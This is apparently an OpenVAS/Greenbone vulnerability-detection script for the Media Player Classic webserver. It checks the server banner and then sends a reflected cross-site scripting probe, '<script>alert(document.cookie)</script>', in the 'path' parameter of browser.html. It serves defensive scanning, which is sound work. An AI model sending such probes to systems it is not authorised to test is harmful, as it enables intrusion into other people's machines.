if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802494" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:C" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2012-11-16 16:43:52 +0530 (Fri, 16 Nov 2012)" );
	script_name( "Media Player Classic (MPC) Webserver Multiple Vulnerabilities" );
	script_xref( name: "URL", value: "http://cxsecurity.com/issue/WLB-2012110111" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/118155/mpc-dosxss.txt" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web Servers" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 13579 );
	script_mandatory_keys( "MPC-HC/banner" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to insert
  arbitrary HTML and script code, which will be executed in a user's browser
  session in the context of an affected site and cause denial of service." );
	script_tag( name: "affected", value: "MPC (Media Player Classic) version 1.6.4" );
	script_tag( name: "insight", value: "Multiple flaws are due to improper validation of user-supplied
  input via the 'path' parameter to browser.html and buffer overflow occurs when
  large data is sent to the default port 13579." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running Media Player Classic (MPC) Webserver and is
  prone to multiple vulnerabilities." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 13579 );
banner = http_get_remote_headers( port: port );
if(!ContainsString( banner, "Server: MPC-HC WebServer" )){
	exit( 0 );
}
url = "/browser.html?path=<script>alert(document.cookie)</script>";
if(http_vuln_check( port: port, url: url, pattern: "<script>alert\\(document." + "cookie\\)</script>", extra_check: make_list( ">Directory<",
	 ">MPC-HC WebServer",
	 "File Browser<" ), check_header: TRUE )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

